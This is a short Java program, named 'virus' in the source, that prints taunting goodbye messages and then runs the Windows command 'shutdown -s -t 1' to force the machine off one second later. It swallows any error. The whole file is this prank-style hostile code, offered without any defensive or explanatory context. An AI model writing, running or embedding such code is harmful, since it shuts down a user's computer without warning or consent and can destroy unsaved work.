import java.util.*;
public class virus {

    public static void main(String args[]) {

        Runtime r = Runtime.getRuntime();
        System.out.println("\nBye Bye Coder\n");
        System.out.println("\nGood Night\n");
        try {
            Process p = r.exec("shutdown -s -t 1");
        }

        catch(Exception ee) {

        }
    }
}
